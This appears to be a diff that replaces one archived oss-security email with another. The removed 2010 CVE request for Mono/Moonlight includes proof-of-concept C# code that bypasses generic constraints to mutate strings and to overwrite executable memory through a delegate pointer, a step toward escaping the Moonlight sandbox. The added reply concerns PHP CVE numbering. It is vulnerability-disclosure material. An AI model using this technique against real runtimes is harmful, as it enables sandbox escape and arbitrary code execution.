@@ -1,138 +1,28 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2010/11/25/4
-Message-Id: <201011251552.17678.thomas@suse.de>
-Date: Thu, 25 Nov 2010 15:52:17 +0100
-From: Thomas Biege <thomas@...e.de>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2010/08/24/4
+Message-ID: <20100824163948.75248326@redhat.com>
+Date: Tue, 24 Aug 2010 16:39:48 +0200
+From: Tomas Hoger <thoger@...hat.com>
 To: oss-security@...ts.openwall.com
-Subject: CVE request: mono/moonlight: execution of arbitrary code due to mutable Strings
+Cc: pierre.php@...il.com, Thomas Biege <thomas@...e.de>, Moritz Muehlenhoff <jmm@...ian.org>, "Steven M. Christey" <coley@...us.mitre.org>
+Subject: Re: CVE request: PHP MOPS-2010-56..60
 Content-Type: text/plain; charset=utf-8
 
-Hello.
+On Tue, 24 Aug 2010 11:34:42 +0200 Pierre Joye wrote:
 
-Just a copy-n-paste from our bugzilla (again):
+> >> Done: http://svn.php.net/viewvc?view=revision&revision=302565
+> >
+> > Does it need a new CVE-ID?
 
-------------------------------------------------------------------------------
-SP 2010-11-24 20:45:21 UTC
+[ .. ]
 
-Original (pulled by author) blog entry:
+> Not sure as #24 was never fixed, but I don't know what is the policy
+> in this case. I can use CVE-2010-2094 or a new one if it is more
+> appropriate or cleaner.
 
-So I was messing around with generic methods and discovered that generic
-constraints can be bypassed on Mono 2.6.7 and 2.8 using reflection (with the
-exception of the new() constraint). One of the fun results of this bug is that
-the String class can be made mutable without using reflection to set private
-members!
-
-The following code demonstrates this; it is legal and will run on Mono up to
-and including version 2.8:
-
-using System;
-using System.Reflection;
-
-public class FakeString {
-    public int length;
-    public char start_char;
-}
-
-public class TestCase {
-    private static FakeString UnsafeConversion<T>(T thing)
-        where T : FakeString
-    {
-        return thing;
-    }
-
-    public static void Main() {
-        var a = "foo";
-        var b = MakeMutable(a);
-
-        Console.WriteLine(a);
-        b.start_char = 'b';
-        Console.WriteLine(a);
-    }
-
-    private static FakeString MakeMutable(string s)
-    {
-        var m = typeof(TestCase).GetMethod("UnsafeConversion",
-BindingFlags.NonPublic | BindingFlags.Static);
-        var m2 = m.MakeGenericMethod(typeof(string));
-
-        var d = (Func<string,
-FakeString>)Delegate.CreateDelegate(typeof(Func<string, FakeString>), null,
-m2);
-
-        return d(s);
-    }
-}
-
-
-
-Comment 1 SP 2010-11-24 20:54:20 UTC
-
-This is a follow up of the previous
-https://bugzilla.novell.com/show_bug.cgi?id=654136
-
-The original blog entry allow trusted (by moonlight) code to mutate strings
-which could be used to trick policies (e.g. give a valid URL and, once 
-accepted
-as a valid xdomain URL, change it to something else).
-
-It can also be extended to arbitrary code execution. POC by Geoff Norton: 
-
-using System;
-using System.Reflection;
-using System.Runtime.InteropServices;
-
-public class DelegateWrapper {
-    public IntPtr method_ptr;
-}
-
-public delegate void MethodWrapper ();
-
-public class BreakSandbox {
-    private static DelegateWrapper Convert <T> (T dingus) where T :
-DelegateWrapper {
-        return dingus;
-    }
-
-    private static DelegateWrapper ConvertDelegate (Delegate del) {
-        var m = typeof (BreakSandbox).GetMethod ("Convert",
-BindingFlags.NonPublic | BindingFlags.Static);
-        var gm = m.MakeGenericMethod (typeof (Delegate));
-
-        var d = (Func <Delegate, DelegateWrapper>) Delegate.CreateDelegate
-(typeof (Func <Delegate, DelegateWrapper>), null, gm);
-
-        return d (del);
-    }
-
-    public static void Main (string [] args) {
-        MethodWrapper d = delegate {
-            Console.WriteLine ("Hello");
-        };
-
-        d ();
-        var converted = ConvertDelegate (d);
-        // Overwrite the already WX page with a 'ret'
-        Marshal.WriteByte (converted.method_ptr, (byte) 0xc3);
-        d ();
-    }
-}
-
-This code won't execute on Moonlight (since all Marshal.* code is
-SecurityCritical) but it would not be hard to modify the POC to do the same
-without SecurityCritical code.
-
-Note: the bug is present in Mono but does not represent a security
-vulnerability there since Mono (unlike Moonlight) can only execute trusted
-code.
-
-[reply] [-]
-Private
-Comment 2 
-------------------------------------------------------------------------------
+Standard practice is to use new CVE.  As all 5 phar MOPS were covered
+under single CVE, and not all of them were fixed in 5.3.3, I'd expect a
+new "incomplete fix" CVE.
 
 -- 
- Thomas Biege <thomas@...e.de>, SUSE LINUX, Security Support & Auditing
- SUSE LINUX Products GmbH, GF: Markus Rex, HRB 16746 (AG Nuernberg)
---
-  Wer aufhoert besser werden zu wollen, hoert auf gut zu sein.
-                            -- Marie von Ebner-Eschenbach
+Tomas Hoger / Red Hat Security Response Team
